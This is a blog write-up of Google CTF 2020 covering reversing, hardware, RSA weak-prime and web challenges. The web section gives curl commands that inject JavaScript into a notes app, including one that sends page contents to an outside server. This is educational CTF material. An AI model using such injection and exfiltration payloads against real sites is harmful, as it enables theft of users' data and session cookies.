---
author: philzook58
comments: true
date: 2020-08-24 21:06:10+00:00
layout: post
link: https://www.philipzucker.com/google-ctf-2020-write-up/
slug: google-ctf-2020-write-up
title: Google CTF 2020 Write Up
wordpress_id: 2948
categories:
- Formal Methods
tags:
- ctf
---




I found a link to the Google CTF as it was ongoing. Me and Ben (Team Skydog! Arf! Arf!) have been meaning to do a CTF for years and a combination of covid and procrastinating packing for a move finally made it happen!







The "easy" problems were ass kickers. I guess they were easy in the sense that total n00bs like us could eventually get them. But good lord. It seems inhuman to me that there are people rocking these things, but there are.







We were able to finish 3 problems and got close to a 4th.







There are similar write ups here [https://ctftime.org/event/1041/tasks/](https://ctftime.org/event/1041/tasks/) . Doesn't seem like I did anything that unusual.







## Beginner Reversing







This one was a binary that needed a password inputted . I booted up [Ghidra](https://ghidra-sre.org/) to take a look at the binary which helped a lot in seeing a decompiled version. I've never really used Ghidra before. This is what Ghidra showed






    
    <code>ulong main(void)
    
    {
      int iVar1;
      uint uVar2;
      undefined auVar3 [16];
      undefined input [16];
      undefined4 local_28;
      undefined4 uStack36;
      undefined4 uStack32;
      undefined4 uStack28;
      
      printf("Flag: ");
      __isoc99_scanf(&DAT_0010200b,input);
      auVar3 = pshufb(input,SHUFFLE);
      auVar3 = CONCAT412(SUB164(auVar3 >> 0x60,0) + ADD32._12_4_,
                         CONCAT48(SUB164(auVar3 >> 0x40,0) + ADD32._8_4_,
                                  CONCAT44(SUB164(auVar3 >> 0x20,0) + ADD32._4_4_,
                                           SUB164(auVar3,0) + ADD32._0_4_))) ^ XOR;
      local_28 = SUB164(auVar3,0);
      uStack36 = SUB164(auVar3 >> 0x20,0);
      uStack32 = SUB164(XOR >> 0x40,0);
      uStack28 = SUB164(XOR >> 0x60,0);
      iVar1 = strncmp(input,(char *)&local_28,0x10);
      if (iVar1 == 0) {
        uVar2 = strncmp((char *)&local_28,EXPECTED_PREFIX,4);
        if (uVar2 == 0) {
          puts("SUCCESS");
          goto LAB_00101112;
        }
      }
      uVar2 = 1;
      puts("FAILURE");
    LAB_00101112:
      return (ulong)uVar2;
    }</code>






    
    <code>        001010a9 e8 b2 ff        CALL       __isoc99_scanf                                   undefined __isoc99_scanf()
                     ff ff
            001010ae 66 0f 6f        MOVDQA     XMM0,xmmword ptr [RSP]=>input
                     04 24
            001010b3 48 89 ee        MOV        RSI,RBP
            001010b6 4c 89 e7        MOV        RDI,R12
            001010b9 ba 10 00        MOV        EDX,0x10
                     00 00
            001010be 66 0f 38        PSHUFB     XMM0,xmmword ptr [SHUFFLE]                       = 
                     00 05 a9 
                     2f 00 00
            001010c7 66 0f fe        PADDD      XMM0,xmmword ptr [ADD32]                         = 
                     05 91 2f                                                                    = null
                     00 00
            001010cf 66 0f ef        PXOR       XMM0,xmmword ptr [XOR]                           = 
                     05 79 2f 
                     00 00
            001010d7 0f 29 44        MOVAPS     xmmword ptr [RSP + local_28],XMM0
                     24 10
            001010dc e8 4f ff        CALL       strncmp                                          int strncmp(char * __s1, char * 
                     ff ff
            001010e1 85 c0           TEST       EAX,EAX
            001010e3 75 1b           JNZ        LAB_00101100
            001010e5 48 8b 35        MOV        RSI=>DAT_00102020,qword ptr [EXPECTED_PREFIX]    = 00102020
                     94 2f 00 00                                                                 = 43h    C
            001010ec ba 04 00        MOV        EDX,0x4
                     00 00
            001010f1 48 89 ef        MOV        RDI,RBP
            001010f4 e8 37 ff        CALL       strncmp                                          int strncmp(char * __s1, char * 
                     ff ff
    </code>







Actually having this in ghidra makes this easier to see than it is here because Ghidra tells you which line of C is which line of assembly. Basically, it appears (after looking up some assembly instructions) that we need to find a string that after shuffling by a fixed pattern (SHUFFLE), packed adding a constant (ADD32), and xoring with a constant (XOR) equals itself. 







I suppose this must be solvable by hand? They are suspiciously reversible operations. But I ended up using Z3 because I already know it pretty well. Something that made me totally nuts was translating byte ordering between x86 and z3. The only way I was able to do it was to go into gdb and go through the program instruction and make sure xmm0 had the same values as z3.






    
    <code>gdb a.out
    break main
    run
    tui enable
    layout asm
    ni a bunch of times
    print $xmm0</code>







Then I put in the appropriate list reversals or reversed the bytes of the binary constants. It wasn't so bad once I realized I had to do that.






    
    <code>from z3 import *
    
    x = BitVec('x', 128)
    
    #print(Extract(,0,x))
    chunks8 = [ Extract(i*8+7, 8*i,x )  for i in range(16)]
    
    #print([print for chunk in chunks8])
    print(chunks8)
    shuffle =  [0x02 ,0x06 ,0x07 , 0x01,  0x05, 0x0b, 0x09, 0x0e, 0x03 , 0x0f ,0x04 ,0x08, 0x0a, 0x0c, 0x0d, 0x00]
    #shuffle = [ 16 - i for i in shuffle ] #?? Endian?  # for z3 ,extract 0 is the least significant 
    shufflex = [chunks8[shuf] for shuf in shuffle]
    
    shufflex = Concat(list(reversed(shufflex)))
    print(shufflex)
    
    chunks32 = [ Extract(i*32+31, 32*i,shufflex )  for i in range(4)]  #[Concat( shufflex[4*i: 4*i+4]) ) for i in range(4)]
    print(chunks32)
    #add32 = [0xefbeadde, 0xaddee1fe, 0x37133713, 0x66746367]
    add32 = [0xedeadbeef, 0xfee1dead, 0x13371337, 0x67637466]
    added = [ chunk + addo for chunk,addo in zip(chunks32,add32) ]
    
    print(added)
    
    xnew = Concat(list(reversed(added))) ^  0xAAF986EB34F823D4385F1A8D49B45876 # 0x7658b4498d1a5f38d423f834eb86f9aa
    print(xnew)
    
    s = Solver()
    s.add(xnew == x)
    #s.add(x !=  649710491438454045931875052661658691 )
    
    #s.add(Extract( 4*8-1 , 0, xnew) == 0x102020 ) # 0x202010 
    print(s.check())
    
    m = s.model()
    print(m)
    print(m.eval(xnew))
    #bit32chunks = [ Extract(high, low, x)  for i in range(4)]
    
    #lower = Extract(31, 0, x) 
    #lower = Extract(31, 0, x)  
    
    
    #x = BitVec('addx', 128)
    #[ Extract(high, low, x)  for i in range(0,16)]</code>







I still don't understand what is going on with the EXPECTED_PREFIX part. Somehow that memory gets filled with "CTF", even though it doesn't have that in the binary file. So maybe that is a red herring?







I wonder if KLEE would've just found it or if there was some other automated tool that would've worked? I see that one write up used angr







## Beginner Hardware







This one had a verilog file and a verilator C++ file. Basically, a string is clocked into a circuit which does some minimal scrambling and then sets a flag once a good key has been sent in. An unexpectedly hard part was figuring out how to get verilator to work, which wasn't strictly necessary. Another hard part was realizing that I was supposed to netcat the key into a server. Somehow I just totally ignored the url that was in the question prompt







Again, I used my formal method super powers just because. I downloaded[ EBMC](http://www.cprover.org/ebmc/), although[ yosys smtbmc ](http://www.clifford.at/papers/2016/yosys-smtbmc/)would probably also work 






    
    <code> ~/Downloads/ebmc check.sv --trace --bound 100</code>







I edited the file slightly. I turned `always_ff` into `always` since ebmc didn't seem to support it. I also initialized the memory to zero so that I could get an actual trace and asserted that `open_safe == 0` so that it would give me a countermodel that opens the safe. ebmc returned a trace, which I sent over netcat to the server and got the real key. One could back out the key by hand here, since it is fairly simple scrambling.






    
    <code>module check(
        input clk,
    
        input [6:0] data,
        output wire open_safe
    );
    
    reg [6:0] memory [7:0];
    reg [2:0] idx = 0;
    //initial begin
    //   memory[0] = 	7'b1000011;
    //  memory[5] =   7'b1010100;
    //   memory[2] =   7'b1010100;
    //    memory[7] =    7'b1111011 ; // 7'x7b;
    //end
    
    integer i;
    initial begin
      for (i=0;i<8;i=i+1)
        memory[i] = 0;
    end
    
    wire [55:0] magic = {
        {memory[0], memory[5]},
        {memory[6], memory[2]},
        {memory[4], memory[3]},
        {memory[7], memory[1]}
    };
    
    wire [55:0] kittens = { magic[9:0],  magic[41:22], magic[21:10], magic[55:42] };
    assign open_safe = kittens == 56'd3008192072309708;
    
    always @(posedge clk) begin
        memory[idx] <= data;
        idx <= idx + 5;
    end
    
    assert property (open_safe==0); //  || memory[0] == 7'b110111); //|| memory[0] != b00110111
    
    endmodule
    
    </code>







## Chunk Norris - Crypto







This one kicked my ass. I know basically nothing about crypto. The prompt was that there is a file that generates primes for an RSA encrytion. They are using a fishy looking generator for the primes.






    
    <code>#!/usr/bin/python3 -u
    
    import random
    from Crypto.Util.number import *
    import gmpy2
    
    a = 0xe64a5f84e2762be5
    chunk_size = 64
    
    def gen_prime(bits):
      s = random.getrandbits(chunk_size)
    
      while True:
        s |= 0xc000000000000001
        p = 0
        for _ in range(bits // chunk_size):
          p = (p << chunk_size) + s
          s = a * s % 2**chunk_size
        if gmpy2.is_prime(p):
          return p
    
    n = gen_prime(1024) * gen_prime(1024)
    e = 65537
    flag = open("flag.txt", "rb").read()
    print('n =', hex(n))
    print('e =', hex(e))
    print('c =', hex(pow(bytes_to_long(flag), e, n)))</code>







I went up a couple blind alleys. The first thing we tried was brute forcing. Maybe if the generator is incredibly weak, we can just generate 1,000,000 primes and we'll get a match. No such luck.







Second I tried interpreting the whole problem into Z3 and Boolector. This did not work either. In hindsight, maybe it could have? Maybe I messed up somewhere in this code?






    
    <code>import random
    from Crypto.Util.number import *
    import gmpy2
    from z3 import *
    
    #x = BitVec('n', 1024)
    
    prime_size = 1024
    chunk_size = 64
    
    s1 = ZeroExt(2*prime_size - chunk_size, BitVec('s1', chunk_size)) #prime_size)
    s2 = ZeroExt(2*prime_size - chunk_size, BitVec('s2', chunk_size))
    
    
    a = 0xe64a5f84e2762be5
    
    def gen_prime(s, bits):
        s |= 0xc000000000000001
        p = 0
        for _ in range(bits // chunk_size):
          p = (p << chunk_size) + s
          s = a * s % 2**chunk_size
        return p
    
    def gen_prime(s, bits):
        s |= 0xc000000000000001
        p = 0
        for _ in range(bits // chunk_size):
          p = (p << chunk_size) + s
          s = a * s % 2**chunk_size
        return p
    
    p = gen_prime(s1,prime_size)
    q = gen_prime(s2,prime_size)
    
    
    #n = 0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19
    #n = 0x90000000000055e4350fbb6baa0349fbde32f2f237fa10573dd3d46b
    #n = BitVecVal("0x90000000000055e4350fbb6baa0349fbde32f2f237fa10573dd3d46b", 64)
    n = BitVec("n",2048) #(declare-const n (_ BitVec 224)  ) 
    #s = parse_smt2_string( " (assert (= n  #x900000000001165742e188538bc53a3e129279c049360928a59b2de9))" , decls={"n": n})
    
    #n = BitVecVal(0x90000000000055e4350fbb6baa0349fbde32f2f237fa10573dd3d46b, 64)
    #print(hex(int(str(n)))) 0xd3899acc7973d22e820d41b4ef33cd232a98366c40fb1d70df2650ca0a96560672496f93afa03e8252a4e63054971cfa8352c9a73504a5caf35f3f5146ffd5f5762480b8140e1230864d3d0edf012bb3dd39b8ce089a64a8935a039e50f8e2ec02d514c892439242257a9bc0f377e5cc1994803cc63697b8aa5ee662a3efa96fb3e6946432e6e86987dabf5d31c7aa650c373b6b00a2cf559e9cfb8f38dc7762d557c45674dde0b5867c8d029a79a89a5feed5b24754bddb10084327fdad0303a09fb3b9306b9439489474dfb5f505460f63a135e85d0e5f71986e1cbce27b3bf3897aa8354206c431850da65cac470f0c1180bbfd4615020bfd5fdaafa2afad
    #s = Solver()
    bv_solver = Solver() 
    '''Then(With('simplify', mul2concat=True),
                     'solve-eqs', 
                     'bit-blast',
                     'sat').solver() '''
    s = bv_solver 
    #nstr = "#xd3899acc7973d22e820d41b4ef33cd232a98366c40fb1d70df2650ca0a96560672496f93afa03e8252a4e63054971cfa8352c9a73504a5caf35f3f5146ffd5f5762480b8140e1230864d3d0edf012bb3dd39b8ce089a64a8935a039e50f8e2ec02d514c892439242257a9bc0f377e5cc1994803cc63697b8aa5ee662a3efa96fb3e6946432e6e86987dabf5d31c7aa650c373b6b00a2cf559e9cfb8f38dc7762d557c45674dde0b5867c8d029a79a89a5feed5b24754bddb10084327fdad0303a09fb3b9306b9439489474dfb5f505460f63a135e85d0e5f71986e1cbce27b3bf3897aa8354206c431850da65cac470f0c1180bbfd4615020bfd5fdaafa2afad"
    nstr = "#xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19"
    
    s.add(parse_smt2_string( f" (assert (= n  {nstr}))" , decls={"n": n}))
    #s.add( s1 < 2**chunk_size)
    #s.add( s2 < 2**chunk_size)
    s.add(s1 <= s2)
    s.add( p * q == n)
    set_option(verbose=10)
    print(s.to_smt2())
    print(s.check())
    m = s.model()
    print(m)
    print(m.eval(p))
    print(m.eval(q))</code>







We also tried using this tool and see if we got any hits. [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) Didn't work. An interesting resource in any case, and I ended up using to to actually do the decryption once I had the primes.







Reading the problem prompt I realized they were emphasizing the way the random number generator was constructed. It turns out that this generator has a name [https://en.wikipedia.org/wiki/Lehmer_random_number_generator](https://en.wikipedia.org/wiki/Lehmer_random_number_generator) . This did not lead to any revelations, so is actually a counter productive observation.







Anyway, looking at it, each 64 bit chunk is kind of independent of each other in the primes. And when you multiply the built primes, the chunks still don't interweave all the much, especially the most and least significant chunk of n. Eventually I realized that the first and last chunk of the key n are simply related to the product of the 2 random numbers `s` used to generate the primes. The least significant chunk of `n = s1 * s2 * a^30 mod 2^64`. And the most significant chunk of n is the most significant 64 bits of s1 * s2  ( minus an unknown but small number of carries). We can reverse the a^30 by using the [modular inverse of a](https://en.wikipedia.org/wiki/Modular_multiplicative_inverse) which I used a web form to calculate. Then we basically have the product of s1 and s2. s1 and s2 are not primes, and this is a much smaller problem, so factoring these numbers is not a challenge. 






    
    <code>import random
    from Crypto.Util.number import *
    import gmpy2
    
    for q in range(16): # search over possible carries
        #e = q * 2 ** 64
        #print(hex(e))
        backn = 0x0273d3d4255f6b19 # least sig bits of n
        frontn = 0xab802dca026b1825 - q # most sig bits of n minus some carry
       
        chunk_size = 64
        bits = 1024
        a = 0xe64a5f84e2762be5 #16594180801339730917
        ainv = 13928521563655641581 # modular inverse wrt 2^64 https://www.dcode.fr/modular-inverse
        n0 = gmpy2.mpz("0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19")
    
    
        abackn = backn # mutiply a^inv ** (30? or 32?) * backn = s1 * s2 mod 2**64
        for _ in range(bits // chunk_size - 1):
            abackn = ainv * abackn % 2**chunk_size
            abackn = ainv * abackn % 2**chunk_size
        print("abackn  ", hex(abackn))
    
        def prime_factors(n): # all prime factors, from a stack exchange post
            i = 2
            factors = []
            while i * i <= n:
                #print(i)
                if n % i:
                    i += 1
                else:
                    n //= i
                    factors.append(i)
            if n > 1:
                factors.append(n)
            return factors
    
    
      
    
    
    
    
    
        def gen_prime_s(s,bits):
            s |= 0xc000000000000001
            p = 0
            for _ in range(bits // chunk_size):
                p = (p << chunk_size) + s
                s = a * s % 2**chunk_size
            return p
    
        print(len(hex(abackn)))
        tot_ss = (frontn * (2 ** (chunk_size)))  + abackn # combine the front and back. Should = s1 * s2
        print("frontbk", hex(tot_ss))
        print(len(hex(tot_ss)))
        g = prime_factors( tot_ss)
        print(g)
        ng = len(g)
        
    
        for i in range(2**ng): # try all ways of splitting prime list. Could do something less stupid, but whatev
            s1 = 1
            s2 = 1
            for x in range(ng):
                if (i >> x) & 1:
                    s1 *= g[x]
                else:
                    s2 *= g[x]
       
          
            p = gen_prime_s(s1,1024)
            q = gen_prime_s(s2,1024)
            n =  p*q
          
            if n == n0:
                print("holy shit")
                print(f"p = {p}", )
                print(f"q = {q}", )</code>







## Pasteurize Web







Strangely enough the web was also pretty hard. This is partially because this is getting further from stuff I know about. We ended up not finishing this one but I think we got close. We're given access to a notes web app. Looking at the source, it turns out the server source was also being served. Eventually we figured out that we could curl in notes in an unexpected format using url-encoding which was conspicuously enabled in body-parser. The sanitizer makes the assumption that it is receiving a string, not an object. When the sanitizer removes the quotes from the JSON.stringify, it actually can remove an opening brace {, and then the first label of the object closes the string. When the note text is spliced into the webpage it isn't properly escaped. We were able to get code to run via sending in an object with labels that were javascript code






    
    <code>curl -d 'content[;a=4;alert();]=;7;&content[;a=5;]=;4;' -H "Content-Type: application/x-www-form-urlencoded" -X POST https://pasteurize.web.ctfcompetition.com/
    </code>







By running an ajax request we could recevie data from TJMike's browser






    
    <code>curl -d 'content[;var xhttp = new XMLHttpRequest();xhttp.open(`POST`, `https://ourserver`, true);xhttp.send(document.documentElement.innerHTML);]=;7;&content[;a=5;]=;4;' -H "Content-Type: application/x-www-form-urlencoded" -X POST https://pasteurize.web.ctfcompetition.com/
    
    </code>







We were at the time limit then. I've heard we needed to grab the document.cookies and that had the key in it?







All told pretty cool. A very well organized CTF with fun challenges. I dunno if CTFs are for me. I felt my blood pressure raising a lot.



